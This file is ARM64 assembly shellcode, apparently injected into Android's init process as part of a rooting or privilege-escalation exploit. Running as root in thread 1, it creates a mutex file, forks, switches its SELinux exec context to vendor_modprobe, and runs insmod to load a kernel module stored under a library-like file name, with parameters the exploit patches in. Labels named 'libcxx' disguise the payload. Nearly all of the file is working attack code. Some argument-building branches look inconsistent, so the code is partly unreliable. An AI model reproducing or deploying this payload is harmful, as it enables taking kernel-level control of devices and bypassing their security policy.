    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
param_soft_reboot:
    .asciz "soft_reboot=1"
/* "package_name=" and its value read as one string: the exploit writes the
 * manager package at libcxx_pkg_val_off before the shellcode runs. */
param_pkg:
    .ascii "package_name="
pkg_val:
    .skip 48, 0
param_stage:
    .ascii "stage="                 /* value written at stage_val before insmod */
stage_val:
    .skip 12, 0                     /* "N\0" plus slack; exploit writes the digit */
param_disable_vr:
    .ascii "disable_vr=1"           /* added when exploit writes a digit at dvr_val */
dvr_val:
    .skip 4, 0

    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data
    .global libcxx_soft_reboot_off
libcxx_soft_reboot_off:
    .int soft_reboot_flag - libcxx_data
    .global libcxx_pkg_val_off
libcxx_pkg_val_off:
    .int pkg_val - libcxx_data
    .global libcxx_stage_val_off
libcxx_stage_val_off:
    .int stage_val - libcxx_data
    .global libcxx_dvr_val_off
libcxx_dvr_val_off:
    .int dvr_val - libcxx_data
soft_reboot_flag:
    .byte 0

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr              // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id
    add     sp, sp, 16

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    sub     sp, sp, 48

    // Fork grandchild: set SELinux exec context → execve insmod
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    str     w0, [sp, 24]
    cbnz    w0, myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0

    // execve("/vendor/bin/insmod",
    //        [exe_path, ko_target, "package_name=<pkg>", ["stage=N",]
    //        ["disable_vr=1",] ["soft_reboot=1",] NULL], NULL)
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    adr     x1, param_pkg
    str     x1, [sp, 16]
    // stage is only passed when the exploit wrote a digit at stage_val
    adr     x1, stage_val
    ldrb    w9, [x1]
    cbz     w9, insmod_no_stage
    adr     x1, param_stage
    str     x1, [sp, 24]
    // disable_vr is only passed when the exploit wrote a digit at dvr_val
    adr     x1, dvr_val
    ldrb    w9, [x1]
    cbz     w9, insmod_no_sr
    adr     x1, param_disable_vr
    str     x1, [sp, 32]
    adr     x9, soft_reboot_flag
    ldrb    w9, [x9]
    cbz     w9, insmod_no_sr
    adr     x1, param_soft_reboot
    str     x1, [sp, 40]
    str     xzr, [sp, 48]
    b       do_insmod
insmod_no_stage:
    // no stage arg; disable_vr can still be set
    adr     x1, dvr_val
    ldrb    w9, [x1]
    cbz     w9, insmod_no_sr
    adr     x1, param_disable_vr
    str     x1, [sp, 24]
    adr     x9, soft_reboot_flag
    ldrb    w9, [x9]
    cbz     w9, insmod_no_sr
    adr     x1, param_soft_reboot
    str     x1, [sp, 32]
    str     xzr, [sp, 40]
    b       do_insmod
insmod_no_sr:
    str     xzr, [sp, 24]
do_insmod:
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

    b       myexit

myexit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
